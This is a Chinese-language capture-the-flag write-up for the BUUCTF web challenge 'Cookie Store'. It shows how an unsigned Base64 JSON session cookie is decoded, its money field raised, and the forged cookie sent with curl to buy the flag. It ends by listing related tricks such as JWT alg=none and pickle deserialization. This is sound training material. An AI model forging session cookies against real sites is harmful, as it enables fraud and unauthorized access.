---

title: "[watevrCTF-2019]Cookie Store"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [cookie-manipulation, base64, session-tampering]
vulnerability: Session 数据使用 Base64 编码存储在客户端 Cookie 中，未加密签名，可被篡改
solved: true
flag: "flag{974d69be-1166-4f27-beaa-69b4af5b7852}"

---

# [watevrCTF-2019] Cookie Store

## 题目概述
一个 Cookie 商店网站，用户初始资金 $50，可以购买三种商品：
- Chocolate Chip Cookie: $1
- Pepparkaka: $10
- Flag Cookie: $100（目标）

## 信息收集
访问页面，发现服务器设置 Cookie：
```
Set-Cookie: session=eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==; Path=/
```

Base64 解码后得到 JSON 结构：
```json
{"money": 50, "history": []}
```

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：客户端 Session 篡改

**原理**：
- 服务器将用户状态（money、history）以 Base64 编码形式存储在客户端 Cookie 中
- 未使用任何加密或签名机制保护数据完整性
- 攻击者可以解码、修改、重新编码 Cookie 值

**判断过程**：
1. 观察到 session cookie 是 Base64 编码
2. 解码后发现是明文 JSON，包含 money 字段
3. 无 HMAC 或签名验证机制
4. 可直接修改 money 值绕过购买限制

## 利用过程（Payload + Flag）

**Step 1**: 构造恶意 Cookie，将 money 改为 100
```bash
# 原始: {"money": 50, "history": []}
# 篡改: {"money": 100, "history": []}
NEW_SESSION=$(echo '{"money": 100, "history": []}' | base64 -w0)
# 结果: eyJtb25leSI6IDEwMCwgImhpc3RvcnkiOiBbXX0K
```

**Step 2**: 使用篡改后的 Cookie 购买 Flag Cookie (id=2)
```bash
curl -X POST "http://target/buy" \
  -H "Cookie: session=eyJtb25leSI6IDEwMCwgImhpc3RvcnkiOiBbXX0K" \
  -d "id=2"
```

**Step 3**: 服务器返回新的 session cookie，解码获取 flag
```bash
echo "eyJtb25leSI6IDAsICJoaXN0b3J5IjogWyJmbGFnezk3NGQ2OWJlLTExNjYtNGYyNy1iZWFhLTY5YjRhZjViNzg1Mn1cbiJdfQ==" | base64 -d
# {"money": 0, "history": ["flag{974d69be-1166-4f27-beaa-69b4af5b7852}\n"]}
```

**Flag**: `flag{974d69be-1166-4f27-beaa-69b4af5b7852}`

## 复现步骤
1. 访问题目页面，获取初始 session cookie
2. Base64 解码 session，修改 money 为 100
3. Base64 编码修改后的 JSON
4. 携带篡改后的 cookie POST /buy，参数 id=2
5. 从响应的 Set-Cookie 中解码获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 客户端Session篡改 | Cookie: session | `{"money": 100, "history": []}` | Base64编解码、Cookie伪造 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
- 遇到 Base64 编码的 Cookie，先解码查看内容结构
- 检查是否存在签名/HMAC 保护机制
- 尝试修改关键字段（money、role、admin 等）

**同类题型套路**：
1. Flask session（需解密或伪造签名）
2. JWT token 篡改（alg=none 攻击）
3. PHP serialize 反序列化漏洞
4. Pickle 反序列化 RCE
